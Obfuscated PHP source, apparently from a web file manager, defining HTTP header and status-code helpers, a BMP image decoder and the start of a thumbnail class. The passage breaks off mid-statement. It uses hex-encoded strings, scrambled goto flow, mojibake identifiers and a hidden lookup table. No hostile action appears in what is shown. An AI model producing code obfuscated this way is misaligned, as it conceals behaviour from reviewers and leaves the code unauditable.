føˆ–Æ˜Ÿæ; fô£¯’ùÒ: class HttpHeader { public static $_headers = array("\110\x6f\x73\x74" => "\110\x54\x54\x50\x5f\110\117\x53\x54", "\125\163\145\x72\x2d\x41\147\145\x6e\164" => "\110\x54\x54\120\137\125\x53\105\x52\x5f\101\x47\x45\x4e\x54", "\103\157\x6e\x74\145\x6e\x74\x2d\124\171\160\145" => "\110\x54\x54\120\137\103\x4f\116\x54\105\x4e\x54\137\x54\131\x50\105", "\103\157\156\164\145\x6e\x74\x2d\114\x65\x6e\x67\x74\150" => "\x48\124\124\120\137\103\x4f\x4e\124\105\116\124\137\114\x45\x4e\107\124\110", "\x44\145\x70\164\x68" => "\x48\124\x54\x50\137\104\x45\120\x54\x48", "\x45\x78\x70\145\143\x74" => "\110\124\x54\x50\x5f\x45\x58\120\x45\103\124", "\x49\x66\55\x4e\x6f\156\145\x2d\115\x61\x74\143\150" => "\110\x54\124\120\137\x49\x46\137\116\x4f\116\x45\137\x4d\x41\x54\x43\x48", "\x49\146\55\x4d\x61\x74\143\150" => "\x48\124\124\x50\x5f\x49\106\x5f\115\x41\x54\x43\x48", "\111\146\55\x52\x61\156\147\x65" => "\110\124\124\x50\x5f\111\x46\x5f\122\x41\116\x47\105", "\x4c\x61\163\164\x2d\115\157\x64\151\146\x69\145\144" => "\110\x54\x54\120\137\114\x41\x53\124\x5f\x4d\x4f\104\111\106\x49\x45\x44", "\x49\x66\x2d\x4d\157\x64\151\x66\151\x65\144\55\x53\x69\x6e\x63\145" => "\110\124\124\120\137\111\106\x5f\115\x4f\104\111\x46\111\x45\104\x5f\x53\x49\x4e\x43\105", "\x49\146\55\125\156\155\157\144\x69\x66\151\145\144\55\x53\x69\156\x63\x65" => "\110\124\124\120\137\111\106\x5f\125\116\x4d\x4f\104\x49\x46\111\x45\x44\x5f\123\x49\116\x43\x45", "\x52\141\156\147\x65" => "\x48\124\124\120\x5f\x52\x41\116\x47\105", "\x54\x69\x6d\145\x6f\165\164" => "\x48\x54\124\120\137\124\111\x4d\x45\117\x55\124", "\111\x66" => "\x48\124\124\x50\137\x49\106", "\x4c\157\x63\x6b\55\124\157\153\145\x6e" => "\110\124\124\x50\137\114\x4f\103\x4b\x5f\x54\117\x4b\x45\116", "\x4f\166\145\162\167\x72\x69\164\x65" => "\110\x54\x54\120\137\x4f\126\105\122\x57\x52\111\124\105", "\104\x65\163\164\x69\x6e\141\x74\x69\x6f\x6e" => "\x48\124\124\120\137\104\x45\x53\124\111\116\x41\124\111\x4f\116", "\122\145\x71\x75\x65\163\x74\x2d\x49\x64" => "\x52\105\x51\x55\105\123\x54\x5f\x49\104", "\x52\x65\x71\x75\145\163\x74\x2d\102\x6f\x64\x79\x2d\x46\151\x6c\x65" => "\x52\x45\x51\125\105\x53\124\137\x42\x4f\x44\x59\x5f\x46\x49\x4c\105", "\122\145\x64\151\x72\145\x63\x74\55\x53\164\x61\164\x75\x73" => "\122\105\x44\111\122\x45\x43\124\x5f\x53\x54\x41\x54\x55\x53"); public static function init() { static $a½‘óø«ñ« = false; if ($a½‘óø«ñ«) { return; } foreach ($_SERVER as $BÏîÆæéó => $b‘ß¬Èà»Õ) { $BÏîÆæéó = strtoupper($BÏîÆæéó); if (!array_key_exists($BÏîÆæéó, $_SERVER)) { continue; } $_SERVER[$BÏîÆæéó] = $b‘ß¬Èà»Õ; } foreach (self::$_headers as $BÏîÆæéó => $fßÄï¦‡²ª) { if (!array_key_exists($BÏîÆæéó, $_SERVER)) { continue; } $_SERVER[$BÏîÆæéó] = $_SERVER[$fßÄï¦‡²ª]; $_SERVER[strtoupper($BÏîÆæéó)] = $_SERVER[$fßÄï¦‡²ª]; } } public static function get($BŞÉîƒÑÆ) { self::init(); return $_SERVER[$BŞÉîƒÑÆ] ? $_SERVER[$BŞÉîƒÑÆ] : $_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][1834] . strtoupper($BŞÉîƒÑÆ)]; } public static function method() { return strtoupper(self::get($_SERVER[´Ù×Íå‘ÄõÛ][154])); } public static function length() { $Eçöº¸¯Ô =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C…ÓØ—ºŞ = self::get($Eçöº¸¯Ô[1835]); if (!$C…ÓØ—ºŞ) { $C…ÓØ—ºŞ = self::get($Eçöº¸¯Ô[1150]); } return $C…ÓØ—ºŞ; } public static function range() { $Dí‡õÌ¼¸° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C‚ŠßÍñõš = self::get($Dí‡õÌ¼¸°[198]); if (!$C‚ŠßÍñõš) { return !1; } if (!preg_match($Dí‡õÌ¼¸°[1836], $C‚ŠßÍñõš, $e³Š¸‚“´ò)) { return !1; } if ($e³Š¸‚“´ò[1] === $Dí‡õÌ¼¸°[33] && $e³Š¸‚“´ò[2] === $Dí‡õÌ¼¸°[33]) { return !1; } return array($e³Š¸‚“´ò[1] !== $Dí‡õÌ¼¸°[33] ? $e³Š¸‚“´ò[1] : null, $e³Š¸‚“´ò[2] !== $Dí‡õÌ¼¸°[33] ? $e³Š¸‚“´ò[2] : null); } public static $statusCode = array("\x31\x30\60" => "\x43\x6f\156\x74\151\x6e\165\x65", "\x31\x30\x31" => "\x53\x77\151\x74\x63\x68\x69\156\x67\40\x50\x72\157\164\x6f\143\157\x6c", "\x31\x30\62" => "\120\x72\157\143\x65\163\x73\151\156\147", "\61\x30\x33" => "\105\x61\162\154\x79\x20\110\x69\156\164\x73", "\x32\60\x30" => "\117\x4b", "\62\x30\61" => "\x43\x72\x65\141\164\145\144", "\62\60\x32" => "\x41\143\143\145\160\x74\145\144", "\x32\x30\x33" => "\116\x6f\x6e\x2d\101\165\x74\150\x6f\162\151\x74\141\164\151\166\145\40\x49\x6e\x66\x6f\x72\155\141\x74\151\157\x6e", "\62\60\64" => "\x4e\157\40\x43\157\x6e\x74\145\156\x74", "\62\x30\x35" => "\122\145\163\145\164\40\x43\x6f\x6e\164\x65\156\x74", "\62\x30\66" => "\x50\x61\162\x74\151\x61\x6c\x20\x43\x6f\x6e\x74\x65\x6e\164", "\x32\x30\x37" => "\115\165\154\164\x69\55\x53\x74\x61\x74\x75\x73", "\x33\60\x30" => "\115\165\154\164\x69\x70\x6c\145\x20\x43\x68\157\151\143\x65\x73", "\63\x30\61" => "\115\157\166\145\144\40\120\x65\x72\x6d\141\x6e\x65\156\x74\x6c\x79", "\63\x30\x32" => "\x46\x6f\x75\156\x64", "\63\60\x33" => "\x53\x65\x65\40\117\x74\x68\x65\162", "\x33\x30\x34" => "\116\x6f\164\x20\x4d\x6f\144\151\146\151\145\144", "\63\60\x35" => "\x55\163\x65\x20\x50\x72\x6f\170\x79", "\63\x30\x37" => "\x54\x65\x6d\x70\x6f\162\x61\162\171\40\122\x65\144\x69\x72\x65\143\x74", "\x33\60\x38" => "\120\145\162\x6d\x61\x6e\145\x6e\x74\40\122\145\144\x69\x72\145\x63\164", "\x34\x30\60" => "\102\x61\144\x20\122\x65\x71\165\x65\163\x74", "\x34\60\61" => "\x55\x6e\x61\x75\164\x68\157\x72\151\172\145\x64", "\x34\x30\x32" => "\120\x61\x79\155\145\156\164\40\122\x65\x71\x75\x69\162\145\144", "\x34\60\63" => "\106\x6f\162\142\151\144\x64\145\x6e", "\64\60\64" => "\x4e\x6f\x74\40\x46\x6f\x75\156\144", "\x34\x30\65" => "\x4d\x65\x74\x68\157\144\x20\x4e\157\164\40\x41\x6c\154\157\167\x65\x64", "\x34\60\66" => "\x4e\157\x74\40\101\143\x63\145\160\x74\141\142\154\145", "\x34\x30\67" => "\x50\x72\x6f\x78\171\x20\101\165\164\x68\145\156\x74\x69\x63\141\164\x69\x6f\156\40\x52\x65\161\165\x69\x72\145\144", "\x34\60\70" => "\x52\145\x71\165\x65\163\x74\40\x54\151\x6d\x65\157\165\164", "\64\x30\71" => "\x43\157\x6e\146\x6c\151\143\x74", "\x34\x31\60" => "\x47\x6f\x6e\x65", "\x34\61\61" => "\x4c\145\x6e\147\164\150\x20\122\x65\x71\165\151\162\145\x64", "\x34\x31\x32" => "\120\162\145\143\x6f\156\144\151\x74\151\x6f\156\40\106\141\x69\154\x65\144", "\64\x31\63" => "\122\145\161\165\145\x73\164\40\x45\156\164\x69\x74\x79\40\x54\x6f\157\x20\114\x61\162\x67\145", "\x34\61\x34" => "\x52\x65\161\165\145\163\164\x20\x55\122\x49\40\124\x6f\x6f\40\x4c\x61\x72\147\145", "\x34\x31\65" => "\125\156\x73\165\x70\160\x6f\x72\x74\x65\144\x20\115\x65\x64\151\141\40\124\x79\x70\145", "\x34\61\x36" => "\x52\145\161\165\145\163\x74\145\144\x20\x52\x61\156\x67\145\40\116\x6f\x74\x20\123\141\x74\151\x73\x66\x69\x61\142\154\145", "\64\61\67" => "\x45\x78\x70\x65\143\164\141\x74\x69\157\156\x20\x46\141\151\154\145\144", "\x34\x32\62" => "\x55\x6e\x70\162\157\143\x65\163\163\141\x62\x6c\x65\40\x45\156\x74\151\164\x79", "\64\x32\63" => "\114\x6f\143\153\x65\144", "\x34\62\64" => "\106\141\x69\x6c\x65\x64\x20\104\x65\x70\x65\156\x64\145\156\x63\171", "\x34\x32\65" => "\125\156\x6f\x72\144\x65\162\x65\x64\x20\x43\157\154\x6c\145\x63\164\151\157\x6e", "\64\62\x36" => "\x55\160\147\162\141\x64\x65\x20\122\x65\161\165\x69\162\145\144", "\64\x32\x38" => "\120\x72\x65\143\x6f\x6e\144\151\164\x69\x6f\156\x20\122\x65\x71\165\x69\162\x65\144", "\64\62\71" => "\x54\157\x6f\40\115\x61\156\x79\x20\122\x65\x71\x75\145\x73\x74\x73", "\x34\63\x31" => "\122\145\161\165\x65\x73\164\x20\x48\x65\141\x64\145\x72\x20\106\151\x65\x6c\144\x73\x20\124\x6f\157\40\114\141\x72\x67\x65", "\x34\x34\64" => "\116\x6f\x20\122\x65\163\160\157\156\163\x65", "\64\65\60" => "\x42\154\157\143\x6b\145\x64\40\x62\x79\40\127\151\156\x64\x6f\x77\x73\40\x50\141\162\x65\156\x74\141\154\x20\x43\157\156\164\162\x6f\154\x73", "\64\65\x31" => "\125\x6e\141\x76\141\151\154\141\142\x6c\x65\x20\106\x6f\162\40\114\x65\147\x61\154\40\122\145\141\x73\157\x6e\163", "\x34\x39\64" => "\x52\x65\x71\165\145\x73\164\40\110\x65\x61\144\x65\x72\x20\124\x6f\x6f\40\114\x61\x72\147\145", "\x35\60\x30" => "\x49\x6e\164\x65\162\x6e\141\154\x20\123\x65\x72\x76\145\x72\40\x45\x72\162\157\162", "\65\x30\x31" => "\116\157\x74\40\111\x6d\x70\x6c\x65\x6d\145\156\164\145\x64", "\x35\60\x32" => "\x42\141\144\40\x47\x61\164\145\167\x61\x79", "\x35\x30\63" => "\123\x65\162\x76\x69\143\145\40\125\x6e\141\166\141\x69\x6c\x61\x62\x6c\145", "\x35\60\x34" => "\x47\141\164\x65\167\141\x79\x20\124\151\155\x65\x6f\165\164", "\65\x30\65" => "\110\x54\124\120\x20\x56\x65\162\x73\x69\157\156\x20\156\157\164\40\x73\165\x70\160\x6f\162\164\x65\144", "\x35\60\x37" => "\x49\156\x73\x75\x66\146\x69\x63\x69\x65\156\164\x20\x53\x74\157\x72\x61\147\x65"); public static function code($e»¡È‰›ˆ) { $A¥¤‡ø×‰¨ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e»¡È‰›ˆ = $e»¡È‰›ˆ . $A¥¤‡ø×‰¨[33]; $bƒ‘ñ£ƒ§ƒ = self::$statusCode[$e»¡È‰›ˆ]; $bƒ‘ñ£ƒ§ƒ = $bƒ‘ñ£ƒ§ƒ ? "\110\124\124\120\57\61\56\x31\40{$e»¡È‰›ˆ}\40" . $bƒ‘ñ£ƒ§ƒ : $A¥¤‡ø×‰¨[33]; return $bƒ‘ñ£ƒ§ƒ; } } class ImageGdBMP { public static function load($E†Š°¸œŠ) { $bœÚÒ·ÇÕ¸ = fopen($E†Š°¸œŠ, $_SERVER[´Ù×Íå‘ÄõÛ][1525]); if ($bœÚÒ·ÇÕ¸ === !1) { return !1; } $fŒ¥·ã’ĞŠ = self::loadFromStream($bœÚÒ·ÇÕ¸); fclose($bœÚÒ·ÇÕ¸); return $fŒ¥·ã’ĞŠ; } public static function loadFromStream($c×ÏËŠ·á) { $D–‚µâ¦â¨ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÉ­ÑÍ—Á„ = fread($c×ÏËŠ·á, 14); if ($CÉ­ÑÍ—Á„ === !1) { return !1; } if ($CÉ­ÑÍ—Á„[0] != $D–‚µâ¦â¨[1837] || $CÉ­ÑÍ—Á„[1] != $D–‚µâ¦â¨[1838]) { return !1; } $AŞé¨îé–Ú = unpack($D–‚µâ¦â¨[1839] . $D–‚µâ¦â¨[1840] . $D–‚µâ¦â¨[1841] . $D–‚µâ¦â¨[1842] . $D–‚µâ¦â¨[1843], $CÉ­ÑÍ—Á„); return self::loadFromStreamAndFileHeader($c×ÏËŠ·á, $AŞé¨îé–Ú); } public static function loadFromStreamAndFileHeader($B·Š„ ï¸ª, array $fáËã¡Š˜·) { goto FŒ‚‰ªË‚Š; b²øåìäß¡: $b±„©î‹æ† = abs($Eƒ¿ßö·Æ); $b´¥‡ªµ¾Ÿ = $Eƒ¿ßö·Æ > 0 ? $b±„©î‹æ† - 1 : 0; $cğÏ¹×¨Úñ = $Eƒ¿ßö·Æ > 0 ? -1 : 1; goto C¬¯¢‰ÁŒ°; b„°ÆĞ‰ò: if ($AšÎğï¹œ… == 0 || $Eƒ¿ßö·Æ == 0 || $CàÎî¨¥…• != 1 || ($cŞğŸéòÄ³ & $eŒÌÚœ˜Ú) != 0 || ($cŞğŸéòÄ³ & $BÖƒ‡Ç²ÊÔ) != 0 || ($cŞğŸéòÄ³ & $aÁ­Ÿ±šºô) != 0 || ($eŒÌÚœ˜Ú & $BÖƒ‡Ç²ÊÔ) != 0 || ($eŒÌÚœ˜Ú & $aÁ­Ÿ±šºô) != 0 || ($BÖƒ‡Ç²ÊÔ & $aÁ­Ÿ±šºô) != 0) { return !1; } if ($a‘•ö¡ë == 4 || $a‘•ö¡ë == 5) { $Bñ½Ú‚•ù = stream_get_contents($B·Š„ ï¸ª, $c…†‘İÆ©Ø); if ($Bñ½Ú‚•ù === !1) { return !1; } return imagecreatefromstring($Bñ½Ú‚•ù); } $C¥¥‚†»Â® = $AšÎğï¹œ… * $F—›³ëù¨ñ + 31 >> 3 & ~3; goto b²øåìäß¡; FŒ‚‰ªË‚Š: $D’‰Ìİ’Œâ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($fáËã¡Š˜·[$D’‰Ìİ’Œâ[388]] != 19778) { return !1; } $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, 4); goto bé´¡Ã­‘‚; bé´¡Ã­‘‚: if ($Bñ½Ú‚•ù === !1) { return !1; } list(, $EíÄÇ¹¿åŠ) = unpack($D’‰Ìİ’Œâ[1844], $Bñ½Ú‚•ù); if ($EíÄÇ¹¿åŠ == 12) { goto FèËŸßÛ÷Á; a‡‹¯Ã»–: $d«‰±æÂæ = $a„Û·›™¡Ê = $cŞğŸéòÄ³ = $a‘•ö¡ë = 0; $eŒÌÚœ˜Ú = 16711680; $BÖƒ‡Ç²ÊÔ = 65280; goto c­àùÙ—¶; c­àùÙ—¶: $aÁ­Ÿ±šºô = 255; goto dµÎï‡·Â¯; FèËŸßÛ÷Á: $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, $EíÄÇ¹¿åŠ - 4); if ($Bñ½Ú‚•ù === !1) { return !1; } extract(unpack($D’‰Ìİ’Œâ[1845] . $D’‰Ìİ’Œâ[1846] . $D’‰Ìİ’Œâ[1847] . $D’‰Ìİ’Œâ[1848], $Bñ½Ú‚•ù)); goto a‡‹¯Ã»–; dµÎï‡·Â¯: } else { if (124 < $EíÄÇ¹¿åŠ || $EíÄÇ¹¿åŠ < 40) { return !1; } else { goto a±óáè·öÀ; fº¦Ø¨Ê’Ş: if (($F—›³ëù¨ñ == 16 || $F—›³ëù¨ñ == 24 || $F—›³ëù¨ñ == 32) && $a‘•ö¡ë == 0 && $eŒÌÚœ˜Ú == 0 && $BÖƒ‡Ç²ÊÔ == 0 && $aÁ­Ÿ±šºô == 0) { switch ($F—›³ëù¨ñ) { case 16: $eŒÌÚœ˜Ú = 31744; $BÖƒ‡Ç²ÊÔ = 992; $aÁ­Ÿ±šºô = 31; break; case 24: case 32: $eŒÌÚœ˜Ú = 16711680; $BÖƒ‡Ç²ÊÔ = 65280; $aÁ­Ÿ±šºô = 255; break; } } goto díÄ¼»õ¸; a±óáè·öÀ: $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, 36); if ($Bñ½Ú‚•ù === !1) { return !1; } extract(unpack($D’‰Ìİ’Œâ[1849] . $D’‰Ìİ’Œâ[1850] . $D’‰Ìİ’Œâ[1847] . $D’‰Ìİ’Œâ[1851] . $D’‰Ìİ’Œâ[1852] . $D’‰Ìİ’Œâ[1853] . $D’‰Ìİ’Œâ[1854] . $D’‰Ìİ’Œâ[1855] . $D’‰Ìİ’Œâ[1856] . $D’‰Ìİ’Œâ[1857], $Bñ½Ú‚•ù)); goto F†ŒÆŞ¤±—; F†ŒÆŞ¤±—: if ($AšÎğï¹œ… & 2147483648) { $AšÎğï¹œ… = -(~$AšÎğï¹œ… & 4294967295) - 1; } if ($Eƒ¿ßö·Æ & 2147483648) { $Eƒ¿ßö·Æ = -(~$Eƒ¿ßö·Æ & 4294967295) - 1; } if ($Eõ¡ãø°Ùò & 2147483648) { $Eõ¡ãø°Ùò = -(~$Eõ¡ãø°Ùò & 4294967295) - 1; } goto e‡Œß†•Šß; e‡Œß†•Šß: if ($BÍÂè”†¾ & 2147483648) { $BÍÂè”†¾ = -(~$BÍÂè”†¾ & 4294967295) - 1; } if ($fáËã¡Š˜·[$D’‰Ìİ’Œâ[522]] != 0) { $BßëµÙÕİ¾ = $F—›³ëù¨ñ == 1 || $F—›³ëù¨ñ == 4 || $F—›³ëù¨ñ == 8 ? ($d«‰±æÂæ ? $d«‰±æÂæ : pow(2, $F—›³ëù¨ñ)) << 2 : 0; $ašòÊºŒ‚„ = $c…†‘İÆ©Ø ? $c…†‘İÆ©Ø : ($AšÎğï¹œ… * $F—›³ëù¨ñ + 31 >> 3 & ~3) * abs($Eƒ¿ßö·Æ); $cÑÖ›³®¼Ü = $fáËã¡Š˜·[$D’‰Ìİ’Œâ[522]] - $ašòÊºŒ‚„ - $BßëµÙÕİ¾ - 14; if ($EíÄÇ¹¿åŠ < $cÑÖ›³®¼Ü && 40 <= $EíÄÇ¹¿åŠ && $EíÄÇ¹¿åŠ <= 124) { $EíÄÇ¹¿åŠ = $cÑÖ›³®¼Ü; } } if ($EíÄÇ¹¿åŠ - 40 > 0) { $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, $EíÄÇ¹¿åŠ - 40); if ($Bñ½Ú‚•ù === !1) { return !1; } extract(unpack($D’‰Ìİ’Œâ[1858] . $D’‰Ìİ’Œâ[1859] . $D’‰Ìİ’Œâ[1860] . $D’‰Ìİ’Œâ[1861], $Bñ½Ú‚•ù . str_repeat($D’‰Ìİ’Œâ[1862], 120))); } else { $cŞğŸéòÄ³ = $eŒÌÚœ˜Ú = $BÖƒ‡Ç²ÊÔ = $aÁ­Ÿ±šºô = 0; } goto fº¦Ø¨Ê’Ş; díÄ¼»õ¸: } } goto b„°ÆĞ‰ò; C¬¯¢‰ÁŒ°: if ($F—›³ëù¨ñ == 1 || $F—›³ëù¨ñ == 4 || $F—›³ëù¨ñ == 8) { goto AãØ‡Ã„ç; eÆô¯‡š•æ: $CõÂğõ…´Œ = array(); for ($aÉ±Ì‘Ö·Ó = 0; $aÉ±Ì‘Ö·Ó < $c”Î÷Î¼¨Û; ++$aÉ±Ì‘Ö·Ó) { $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, $Dœ¶Ü‹œƒã); if ($Bñ½Ú‚•ù === !1) { imagedestroy($bà¤Ü­ã¶ù); return !1; } extract(unpack($D’‰Ìİ’Œâ[1863], $Bñ½Ú‚•ù . $D’‰Ìİ’Œâ[1862])); $CõÂğõ…´Œ[] = imagecolorallocate($bà¤Ü­ã¶ù, $C”‹¢º­¯¦, $e Ü¶Õ¤, $cŠ‘¦ïé‡); } $bÒóá¶¸ìâ = 8 - $F—›³ëù¨ñ; goto cŸ©Ø‚µ­¸; AãØ‡Ã„ç: $bà¤Ü­ã¶ù = imagecreate($AšÎğï¹œ…, $b±„©î‹æ†); $Dœ¶Ü‹œƒã = $EíÄÇ¹¿åŠ == 12 ? 3 : 4; $c”Î÷Î¼¨Û = $d«‰±æÂæ ? $d«‰±æÂæ : pow(2, $F—›³ëù¨ñ); goto eÆô¯‡š•æ; cŸ©Ø‚µ­¸: $E¦è›¦èªô = (1 << $F—›³ëù¨ñ) - 1 << $bÒóá¶¸ìâ; if ($a‘•ö¡ë == 1 || $a‘•ö¡ë == 2) { $fÆ“ìŞ‚è = 0; $DÈî­âÆŞİ = $F—›³ëù¨ñ >> 2 & 1; for (;;) { if ($fÆ“ìŞ‚è < -1 || $fÆ“ìŞ‚è > $AšÎğï¹œ… || $b´¥‡ªµ¾Ÿ < -1 || $b´¥‡ªµ¾Ÿ > $Eƒ¿ßö·Æ) { imagedestroy($bà¤Ü­ã¶ù); return !1; } $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, 1); if ($Bñ½Ú‚•ù === !1) { imagedestroy($bà¤Ü­ã¶ù); return !1; } switch ($Bñ½Ú‚•ù) { case $D’‰Ìİ’Œâ[1862]: $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, 1); if ($Bñ½Ú‚•ù === !1) { imagedestroy($bà¤Ü­ã¶ù); return !1; } switch ($Bñ½Ú‚•ù) { case $D’‰Ìİ’Œâ[1862]: $b´¥‡ªµ¾Ÿ += $cğÏ¹×¨Úñ; $fÆ“ìŞ‚è = 0; break; case $D’‰Ìİ’Œâ[1864]: $b´¥‡ªµ¾Ÿ = 0; $fÆ“ìŞ‚è = 0; break 3; case $D’‰Ìİ’Œâ[1865]: $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, 2); if ($Bñ½Ú‚•ù === !1) { imagedestroy($bà¤Ü­ã¶ù); return !1; } list(, $bÙ…ğ°§Á•, $AÖõ¿á•¸¯) = unpack($D’‰Ìİ’Œâ[1866], $Bñ½Ú‚•ù); $fÆ“ìŞ‚è += $bÙ…ğ°§Á•; $b´¥‡ªµ¾Ÿ += $AÖõ¿á•¸¯ * $cğÏ¹×¨Úñ; break; default: list(, $fÂ•›öëæ‚) = unpack($D’‰Ìİ’Œâ[1867], $Bñ½Ú‚•ù); $fÉîº¨ëÙ¸ = ($fÂ•›öëæ‚ >> $DÈî­âÆŞİ) + ($fÂ•›öëæ‚ & $DÈî­âÆŞİ); $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, $fÉîº¨ëÙ¸ + 1 & ~1); if ($Bñ½Ú‚•ù === !1) { imagedestroy($bà¤Ü­ã¶ù); return !1; } for ($aÉ±Ì‘Ö·Ó = 0, $D‰…ÑğÉ£Ğ = 0; $aÉ±Ì‘Ö·Ó < $fÂ•›öëæ‚; ++$aÉ±Ì‘Ö·Ó, ++$fÆ“ìŞ‚è, $D‰…ÑğÉ£Ğ += $F—›³ëù¨ñ) { list(, $EÇ‹ÎáĞ¡ò) = unpack($D’‰Ìİ’Œâ[1867], $Bñ½Ú‚•ù[$D‰…ÑğÉ£Ğ >> 3]); $cŠ‘¦ïé‡ = $D‰…ÑğÉ£Ğ & 7; imagesetpixel($bà¤Ü­ã¶ù, $fÆ“ìŞ‚è, $b´¥‡ªµ¾Ÿ, $CõÂğõ…´Œ[($EÇ‹ÎáĞ¡ò & $E¦è›¦èªô >> $cŠ‘¦ïé‡) >> $bÒóá¶¸ìâ - $cŠ‘¦ïé‡]); } break; } break; default: $F×àç©£•Æ = fread($B·Š„ ï¸ª, 1); if ($F×àç©£•Æ === !1) { imagedestroy($bà¤Ü­ã¶ù); return !1; } list(, $b×¯çŠĞõé, $EÇ‹ÎáĞ¡ò) = unpack($D’‰Ìİ’Œâ[1866], $Bñ½Ú‚•ù . $F×àç©£•Æ); for ($aÉ±Ì‘Ö·Ó = 0, $D‰…ÑğÉ£Ğ = 0; $aÉ±Ì‘Ö·Ó < $b×¯çŠĞõé; ++$aÉ±Ì‘Ö·Ó, ++$fÆ“ìŞ‚è, $D‰…ÑğÉ£Ğ += $F—›³ëù¨ñ) { $cŠ‘¦ïé‡ = $D‰…ÑğÉ£Ğ & 7; imagesetpixel($bà¤Ü­ã¶ù, $fÆ“ìŞ‚è, $b´¥‡ªµ¾Ÿ, $CõÂğõ…´Œ[($EÇ‹ÎáĞ¡ò & $E¦è›¦èªô >> $cŠ‘¦ïé‡) >> $bÒóá¶¸ìâ - $cŠ‘¦ïé‡]); } break; } } } else { for ($DÈ“îñõÁ = 0; $DÈ“îñõÁ < $b±„©î‹æ†; ++$DÈ“îñõÁ, $b´¥‡ªµ¾Ÿ += $cğÏ¹×¨Úñ) { $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, $C¥¥‚†»Â®); if ($Bñ½Ú‚•ù === !1) { imagedestroy($bà¤Ü­ã¶ù); return !1; } $D‰…ÑğÉ£Ğ = 0; for ($fÆ“ìŞ‚è = 0; $fÆ“ìŞ‚è < $AšÎğï¹œ…; ++$fÆ“ìŞ‚è, $D‰…ÑğÉ£Ğ += $F—›³ëù¨ñ) { list(, $EÇ‹ÎáĞ¡ò) = unpack($D’‰Ìİ’Œâ[1867], $Bñ½Ú‚•ù[$D‰…ÑğÉ£Ğ >> 3]); $cŠ‘¦ïé‡ = $D‰…ÑğÉ£Ğ & 7; imagesetpixel($bà¤Ü­ã¶ù, $fÆ“ìŞ‚è, $b´¥‡ªµ¾Ÿ, $CõÂğõ…´Œ[($EÇ‹ÎáĞ¡ò & $E¦è›¦èªô >> $cŠ‘¦ïé‡) >> $bÒóá¶¸ìâ - $cŠ‘¦ïé‡]); } } } goto bÆ¤¦À¹ª; bÆ¤¦À¹ª: } else { goto fèÂ‰äŠŒ‡; f”ÌíÔì: for ($DÈ“îñõÁ = 0; $DÈ“îñõÁ < $b±„©î‹æ†; ++$DÈ“îñõÁ, $b´¥‡ªµ¾Ÿ += $cğÏ¹×¨Úñ) { $Bñ½Ú‚•ù = fread($B·Š„ ï¸ª, $C¥¥‚†»Â®); if ($Bñ½Ú‚•ù === !1) { imagedestroy($bà¤Ü­ã¶ù); return !1; } $D‰…ÑğÉ£Ğ = 0; for ($fÆ“ìŞ‚è = 0; $fÆ“ìŞ‚è < $AšÎğï¹œ…; ++$fÆ“ìŞ‚è, $D‰…ÑğÉ£Ğ += $aö¾àìÁƒÃ) { list(, $EÇ‹ÎáĞ¡ò) = unpack($D’‰Ìİ’Œâ[1844], substr($Bñ½Ú‚•ù, $D‰…ÑğÉ£Ğ, $aö¾àìÁƒÃ) . $D’‰Ìİ’Œâ[1868]); $B…çĞ‰Ö‚ = $EÇ‹ÎáĞ¡ò & $cŞğŸéòÄ³; $B·ÙÆöäËˆ = $EÇ‹ÎáĞ¡ò & $eŒÌÚœ˜Ú; $e³‹›ãç·ä = $EÇ‹ÎáĞ¡ò & $BÖƒ‡Ç²ÊÔ; $fö“„ƒî = $EÇ‹ÎáĞ¡ò & $aÁ­Ÿ±šºô; $E‹ß¸ƒƒ±ç = $có•Éµç²¹ - (($B…çĞ‰Ö‚ << 7) - $B…çĞ‰Ö‚) * $dà´œÒ¤‚ ; $C”‹¢º­¯¦ = (($B·ÙÆöäËˆ << 8) - $B·ÙÆöäËˆ) * $fáŒ©í–¦„; $e Ü¶Õ¤ = (($e³‹›ãç·ä << 8) - $e³‹›ãç·ä) * $C¥”ëá¿ô¥; $cŠ‘¦ïé‡ = (($fö“„ƒî << 8) - $fö“„ƒî) * $Cëİ‘ÔÂÆ; imagesetpixel($bà¤Ü­ã¶ù, $fÆ“ìŞ‚è, $b´¥‡ªµ¾Ÿ, $E‹ß¸ƒƒ±ç << 24 | $C”‹¢º­¯¦ << 16 | $e Ü¶Õ¤ << 8 | $cŠ‘¦ïé‡); } } imagealphablending($bà¤Ü­ã¶ù, !0); goto e²Ì—õ±; c‹¬Ò¶òñï: $aö¾àìÁƒÃ = $F—›³ëù¨ñ >> 3; $có•Éµç²¹ = $cŞğŸéòÄ³ ? 127 : 0; $dà´œÒ¤‚  = $cŞğŸéòÄ³ ? 1 / $cŞğŸéòÄ³ : 1; goto DÅí…»Æš; fèÂ‰äŠŒ‡: $bà¤Ü­ã¶ù = imagecreatetruecolor($AšÎğï¹œ…, $b±„©î‹æ†); imagealphablending($bà¤Ü­ã¶ù, !1); if ($cŞğŸéòÄ³) { imagesavealpha($bà¤Ü­ã¶ù, !0); } goto c‹¬Ò¶òñï; DÅí…»Æš: $fáŒ©í–¦„ = $eŒÌÚœ˜Ú ? 1 / $eŒÌÚœ˜Ú : 1; $C¥”ëá¿ô¥ = $BÖƒ‡Ç²ÊÔ ? 1 / $BÖƒ‡Ç²ÊÔ : 1; $Cëİ‘ÔÂÆ = $aÁ­Ÿ±šºô ? 1 / $aÁ­Ÿ±šºô : 1; goto f”ÌíÔì; e²Ì—õ±: } return $bà¤Ü­ã¶ù; goto Fé™äµ–×Ğ; Fé™äµ–×Ğ: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($E­šš‚…ë, $E¯èÄ†) { goto aƒÑ’ù²; bå’´ëÛó: if (!$this->im) { return !1; } $b‹‡ŒğÊ¡ = $_SERVER[´Ù×Íå‘ÄõÛ][33]; $this->imgData = 